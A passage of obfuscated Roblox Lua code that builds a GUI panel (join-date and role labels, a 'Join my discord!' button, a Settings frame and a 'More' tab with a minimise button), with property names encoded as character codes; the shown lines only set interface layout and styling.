_llza[_sc(56,97)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(56,97)][_sc(84,101,120,116)]=[[🗓️ XXXX-X-X (X days)]];
_llza[_sc(56,97)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(56,97)][_sc(90,73,110,100,101,120)]=10;
_llza[_sc(56,97)][_sc(78,97,109,101)]=[[joindate]];
_llza[_sc(56,97)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0, 0, 0, 53);
_llza[_sc(56,98)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(56,97)]);
_llza[_sc(56,98)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 6);
_llza[_sc(56,99)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(56,97)]);
_llza[_sc(56,99)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(56,100)]=Instance.new(_sc(73,109,97,103,101,76,97,98,101,108),_llza[_sc(56,49)]);
_llza[_sc(56,100)][_sc(86,105,115,105,98,108,101)]=false;
_llza[_sc(56,100)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(56,100)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(56,100)][_sc(73,109,97,103,101)]=[[rbxasset://textures/ui/GuiImagePlaceholder.png]];
_llza[_sc(56,100)][_sc(83,105,122,101)]=UDim2.new(0, 50, 0, 50);
_llza[_sc(56,100)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(56,100)][_sc(78,97,109,101)]=[[profile]];
_llza[_sc(56,100)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0, 110, 0, 0);
_llza[_sc(56,100)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(56,101)]=Instance.new(_sc(85,73,67,111,114,110,101,114),_llza[_sc(56,100)]);
_llza[_sc(56,102)]=Instance.new(_sc(84,101,120,116,76,97,98,101,108),_llza[_sc(56,49)]);
_llza[_sc(56,102)][_sc(84,101,120,116,87,114,97,112,112,101,100)]=true;
_llza[_sc(56,102)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(56,102)][_sc(84,101,120,116,83,99,97,108,101,100)]=true;
_llza[_sc(56,102)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(56,102)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(56,102)][_sc(84,101,120,116,88,65,108,105,103,110,109,101,110,116)]=Enum.TextXAlignment.Left;
_llza[_sc(56,102)][_sc(84,101,120,116,84,114,97,110,115,112,97,114,101,110,99,121)]=0.3;
_llza[_sc(56,102)][_sc(84,101,120,116,83,105,122,101)]=12;
_llza[_sc(56,102)][_sc(83,105,122,101)]=UDim2.new(0, 100, 0, 13);
_llza[_sc(56,102)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(56,102)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(56,102)][_sc(84,101,120,116)]=[[(USER)]];
_llza[_sc(56,102)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(56,102)][_sc(90,73,110,100,101,120)]=10;
_llza[_sc(56,102)][_sc(78,97,109,101)]=[[role]];
_llza[_sc(56,102)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0, 0, 0, 34);
_llza[_sc(57,48)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(56,102)]);
_llza[_sc(57,48)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 6);
_llza[_sc(57,49)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(56,102)]);
_llza[_sc(57,49)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(57,50)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(55,54)]);
_llza[_sc(57,50)][_sc(83,105,122,101)]=UDim2.new(1, 0, 0, 10);
_llza[_sc(57,50)][_sc(76,97,121,111,117,116,79,114,100,101,114)]=3;
_llza[_sc(57,50)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(57,50)][_sc(78,97,109,101)]=[[---DIVIDER---]];
_llza[_sc(57,50)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(57,50)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(57,50)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0, 0, 0.02941, 0);
_llza[_sc(57,50)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(57,51)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(57,50)]);
_llza[_sc(57,51)][_sc(66,111,114,100,101,114,77,111,100,101)]=Enum.BorderMode.Inset;
_llza[_sc(57,51)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(57,51)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(51, 51, 51);
_llza[_sc(57,51)][_sc(78,97,109,101)]=[[dividerFrame]];
_llza[_sc(57,51)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(21, 21, 21);
_llza[_sc(57,52)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(57,51)]);
_llza[_sc(57,52)][_sc(84,104,105,99,107,110,101,115,115)]=2;
_llza[_sc(57,52)][_sc(78,97,109,101)]=[[outlineStroke]];
_llza[_sc(57,53)]=Instance.new(_sc(67,97,110,118,97,115,71,114,111,117,112),_llza[_sc(57,51)]);
_llza[_sc(57,53)][_sc(71,114,111,117,112,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(57,53)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(57,53)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(57,53)][_sc(78,97,109,101)]=[[buttonFade]];
_llza[_sc(57,53)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(57,53)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(57,54)]=Instance.new(_sc(85,73,71,114,97,100,105,101,110,116),_llza[_sc(57,53)]);
_llza[_sc(57,54)][_sc(84,114,97,110,115,112,97,114,101,110,99,121)]=NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1), NumberSequenceKeypoint.new(1.000, 0.7)};
_llza[_sc(57,54)][_sc(82,111,116,97,116,105,111,110)]=90;
_llza[_sc(57,55)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(57,51)]);
_llza[_sc(57,55)][_sc(67,111,108,111,114)]=Color3.fromRGB(51, 51, 51);
_llza[_sc(57,56)]=Instance.new(_sc(85,73,67,111,114,110,101,114),_llza[_sc(57,51)]);
_llza[_sc(57,57)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(57,50)]);
_llza[_sc(57,57)][_sc(80,97,100,100,105,110,103,84,111,112)]=UDim.new(0, 3);
_llza[_sc(57,57)][_sc(80,97,100,100,105,110,103,66,111,116,116,111,109)]=UDim.new(0, 3);
_llza[_sc(57,57)][_sc(80,97,100,100,105,110,103,82,105,103,104,116)]=UDim.new(0, 6);
_llza[_sc(57,57)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 6);
_llza[_sc(57,97)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(55,54)]);
_llza[_sc(57,97)][_sc(83,105,122,101)]=UDim2.new(1, 0, 0, 23);
_llza[_sc(57,97)][_sc(76,97,121,111,117,116,79,114,100,101,114)]=4;
_llza[_sc(57,97)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(57,97)][_sc(78,97,109,101)]=[[discord]];
_llza[_sc(57,97)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(57,97)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(57,97)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0, 0, 0.02941, 0);
_llza[_sc(57,97)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(57,98)]=Instance.new(_sc(84,101,120,116,66,117,116,116,111,110),_llza[_sc(57,97)]);
_llza[_sc(57,98)][_sc(90,73,110,100,101,120)]=49;
_llza[_sc(57,98)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(57,98)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(57,98)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(57,98)][_sc(84,101,120,116,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(57,98)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(57,98)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(57,98)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(57,98)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(57,98)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(57,98)][_sc(78,97,109,101)]=[[button]];
_llza[_sc(57,99)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(57,98)]);
_llza[_sc(57,99)][_sc(80,97,100,100,105,110,103,84,111,112)]=UDim.new(0, 2);
_llza[_sc(57,99)][_sc(80,97,100,100,105,110,103,66,111,116,116,111,109)]=UDim.new(0, 2);
_llza[_sc(57,99)][_sc(80,97,100,100,105,110,103,82,105,103,104,116)]=UDim.new(0, 3);
_llza[_sc(57,99)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 3);
_llza[_sc(57,100)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(57,98)]);
_llza[_sc(57,100)][_sc(66,111,114,100,101,114,77,111,100,101)]=Enum.BorderMode.Inset;
_llza[_sc(57,100)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(57,100)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(51, 51, 51);
_llza[_sc(57,100)][_sc(78,97,109,101)]=[[buttonFrame]];
_llza[_sc(57,100)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(21, 21, 21);
_llza[_sc(57,101)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(57,100)]);
_llza[_sc(57,101)][_sc(84,104,105,99,107,110,101,115,115)]=2;
_llza[_sc(57,101)][_sc(78,97,109,101)]=[[outlineStroke]];
_llza[_sc(57,102)]=Instance.new(_sc(67,97,110,118,97,115,71,114,111,117,112),_llza[_sc(57,100)]);
_llza[_sc(57,102)][_sc(71,114,111,117,112,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(57,102)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(57,102)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(57,102)][_sc(78,97,109,101)]=[[buttonFade]];
_llza[_sc(57,102)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(57,102)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(97,48)]=Instance.new(_sc(85,73,71,114,97,100,105,101,110,116),_llza[_sc(57,102)]);
_llza[_sc(97,48)][_sc(84,114,97,110,115,112,97,114,101,110,99,121)]=NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1), NumberSequenceKeypoint.new(1.000, 0.7)};
_llza[_sc(97,48)][_sc(82,111,116,97,116,105,111,110)]=90;
_llza[_sc(97,49)]=Instance.new(_sc(84,101,120,116,76,97,98,101,108),_llza[_sc(57,98)]);
_llza[_sc(97,49)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(97,49)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(97,49)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(97,49)][_sc(84,101,120,116,83,116,114,111,107,101,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(97,49)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(97,49)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(97,49)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(0, 124, 255);
_llza[_sc(97,49)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(97,49)][_sc(84,101,120,116)]=[[Join my discord!]];
_llza[_sc(97,49)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(97,49)][_sc(90,73,110,100,101,120)]=2;
_llza[_sc(97,49)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(97,50)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(97,49)]);
_llza[_sc(97,50)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(97,51)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(57,97)]);
_llza[_sc(97,51)][_sc(90,73,110,100,101,120)]=90;
_llza[_sc(97,51)][_sc(83,105,122,101)]=UDim2.new(0, 0, 1, 0);
_llza[_sc(97,51)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(97,51)][_sc(78,97,109,101)]=[[fillbar]];
_llza[_sc(97,51)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(97,51)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=0.95;
_llza[_sc(97,51)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(97,52)]=Instance.new(_sc(83,99,114,111,108,108,105,110,103,70,114,97,109,101),_llza[_sc(52,55)]);
_llza[_sc(97,52)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(97,52)][_sc(67,97,110,118,97,115,83,105,122,101)]=UDim2.new(0, 0, 1.5, 0);
_llza[_sc(97,52)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(97,52)][_sc(78,97,109,101)]=[[Settings]];
_llza[_sc(97,52)][_sc(83,105,122,101)]=UDim2.new(0, 360, 0, 255);
_llza[_sc(97,52)][_sc(83,99,114,111,108,108,66,97,114,73,109,97,103,101,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(97,52)][_sc(86,105,115,105,98,108,101)]=false;
_llza[_sc(97,52)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(97,52)][_sc(83,99,114,111,108,108,66,97,114,84,104,105,99,107,110,101,115,115)]=0;
_llza[_sc(97,52)][_sc(65,99,116,105,118,101)]=true;
_llza[_sc(97,52)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(97,52)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0.01351, 0, 0.01887, 0);
_llza[_sc(97,53)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(97,52)]);
_llza[_sc(97,53)][_sc(83,105,122,101)]=UDim2.new(0, 176, 0, 255);
_llza[_sc(97,53)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(97,53)][_sc(78,97,109,101)]=[[rightside]];
_llza[_sc(97,53)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(97,53)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(97,53)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0.51081, 0, 0, 0);
_llza[_sc(97,53)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(97,54)]=Instance.new(_sc(85,73,76,105,115,116,76,97,121,111,117,116),_llza[_sc(97,53)]);
_llza[_sc(97,54)][_sc(83,111,114,116,79,114,100,101,114)]=Enum.SortOrder.LayoutOrder;
_llza[_sc(97,54)][_sc(80,97,100,100,105,110,103)]=UDim.new(0, 5);
_llza[_sc(97,55)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(97,53)]);
_llza[_sc(97,55)][_sc(83,105,122,101)]=UDim2.new(0, 176, 0, 160);
_llza[_sc(97,55)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(97,55)][_sc(78,97,109,101)]=[[moreTab]];
_llza[_sc(97,55)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(97,55)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(11, 11, 11);
_llza[_sc(97,56)]=Instance.new(_sc(76,111,99,97,108,83,99,114,105,112,116),_llza[_sc(97,55)]);
_llza[_sc(97,56)][_sc(78,97,109,101)]=_sc(109,111,114,101,83,99,114,105,112,116);
_llza[_sc(97,57)]=Instance.new(_sc(85,73,76,105,115,116,76,97,121,111,117,116),_llza[_sc(97,55)]);
_llza[_sc(97,57)][_sc(72,111,114,105,122,111,110,116,97,108,70,108,101,120)]=Enum.UIFlexAlignment.Fill;
_llza[_sc(97,57)][_sc(83,111,114,116,79,114,100,101,114)]=Enum.SortOrder.LayoutOrder;
_llza[_sc(97,97)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(97,55)]);
_llza[_sc(97,97)][_sc(67,111,108,111,114)]=Color3.fromRGB(51, 51, 51);
_llza[_sc(97,97)][_sc(78,97,109,101)]=[[greystroke]];
_llza[_sc(97,97)][_sc(65,112,112,108,121,83,116,114,111,107,101,77,111,100,101)]=Enum.ApplyStrokeMode.Border;
_llza[_sc(97,97)][_sc(90,73,110,100,101,120)]=99;
_llza[_sc(97,98)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(97,55)]);
_llza[_sc(97,98)][_sc(83,105,122,101)]=UDim2.new(1, 0, 0, 4);
_llza[_sc(97,98)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(97,98)][_sc(78,97,109,101)]=[[======ACCENT======]];
_llza[_sc(97,98)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(97,98)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(97,98)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(97,99)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(97,98)]);
_llza[_sc(97,99)][_sc(83,105,122,101)]=UDim2.new(1, -2, 0, 2);
_llza[_sc(97,99)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(97,99)][_sc(78,97,109,101)]=[[GuiColor]];
_llza[_sc(97,99)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(97,99)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0, 1, 0, 1);
_llza[_sc(97,99)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(0, 124, 255);
_llza[_sc(97,100)]=Instance.new(_sc(85,73,67,111,114,110,101,114),_llza[_sc(97,99)]);
_llza[_sc(97,101)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(97,55)]);
_llza[_sc(97,101)][_sc(83,105,122,101)]=UDim2.new(1, 0, 0, 15);
_llza[_sc(97,101)][_sc(76,97,121,111,117,116,79,114,100,101,114)]=1;
_llza[_sc(97,101)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(97,101)][_sc(78,97,109,101)]=[[======TITLE======]];
_llza[_sc(97,101)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(97,101)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(97,101)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0, 0, 0.02941, 0);
_llza[_sc(97,101)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(97,102)]=Instance.new(_sc(84,101,120,116,76,97,98,101,108),_llza[_sc(97,101)]);
_llza[_sc(97,102)][_sc(84,101,120,116,87,114,97,112,112,101,100)]=true;
_llza[_sc(97,102)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(97,102)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(97,102)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(97,102)][_sc(84,101,120,116,88,65,108,105,103,110,109,101,110,116)]=Enum.TextXAlignment.Left;
_llza[_sc(97,102)][_sc(84,101,120,116,84,114,97,110,115,112,97,114,101,110,99,121)]=0.3;
_llza[_sc(97,102)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(97,102)][_sc(83,105,122,101)]=UDim2.new(1, 0, 0, 15);
_llza[_sc(97,102)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(97,102)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(97,102)][_sc(84,101,120,116)]=[[More]];
_llza[_sc(97,102)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(97,102)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(97,102)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0.02273, 0, 0, 0);
_llza[_sc(98,48)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(97,102)]);
_llza[_sc(98,48)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(98,49)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(97,102)]);
_llza[_sc(98,49)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 1);
_llza[_sc(98,50)]=Instance.new(_sc(84,101,120,116,66,117,116,116,111,110),_llza[_sc(97,101)]);
_llza[_sc(98,50)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(98,50)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(98,50)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(98,50)][_sc(84,101,120,116,84,114,97,110,115,112,97,114,101,110,99,121)]=0.3;
_llza[_sc(98,50)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(98,50)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(98,50)][_sc(83,105,122,101)]=UDim2.new(0, 35, 1, 0);
_llza[_sc(98,50)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(98,50)][_sc(84,101,120,116)]=[[-]];
_llza[_sc(98,50)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(98,50)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(1, -30, 0, 0);
_llza[_sc(98,50)][_sc(78,97,109,101)]=[[minimise]];
_llza[_sc(98,51)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(97,55)]);
_llza[_sc(98,51)][_sc(83,105,122,101)]=UDim2.new(1, 0, 0, 23);
_llza[_sc(98,51)][_sc(76,97,121,111,117,116,79,114,100,101,114)]=2;
_llza[_sc(98,51)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(98,51)][_sc(78,97,109,101)]=[[destroygui]];
_llza[_sc(98,51)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(98,51)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(98,51)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0, 0, 0.02941, 0);
_llza[_sc(98,51)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(98,52)]=Instance.new(_sc(84,101,120,116,66,117,116,116,111,110),_llza[_sc(98,51)]);
_llza[_sc(98,52)][_sc(90,73,110,100,101,120)]=49;
_llza[_sc(98,52)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(98,52)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(98,52)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(98,52)][_sc(84,101,120,116,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(98,52)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(98,52)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(98,52)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(98,52)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(98,52)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(98,52)][_sc(78,97,109,101)]=[[button]];
_llza[_sc(98,53)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(98,52)]);
_llza[_sc(98,53)][_sc(80,97,100,100,105,110,103,84,111,112)]=UDim.new(0, 2);
_llza[_sc(98,53)][_sc(80,97,100,100,105,110,103,66,111,116,116,111,109)]=UDim.new(0, 2);
_llza[_sc(98,53)][_sc(80,97,100,100,105,110,103,82,105,103,104,116)]=UDim.new(0, 3);
_llza[_sc(98,53)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 3);
_llza[_sc(98,54)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(98,52)]);
_llza[_sc(98,54)][_sc(66,111,114,100,101,114,77,111,100,101)]=Enum.BorderMode.Inset;
_llza[_sc(98,54)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(98,54)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(51, 51, 51);
_llza[_sc(98,54)][_sc(78,97,109,101)]=[[buttonFrame]];
_llza[_sc(98,54)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(21, 21, 21);
_llza[_sc(98,55)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(98,54)]);
_llza[_sc(98,55)][_sc(84,104,105,99,107,110,101,115,115)]=2;
_llza[_sc(98,55)][_sc(78,97,109,101)]=[[outlineStroke]];
_llza[_sc(98,56)]=Instance.new(_sc(67,97,110,118,97,115,71,114,111,117,112),_llza[_sc(98,54)]);
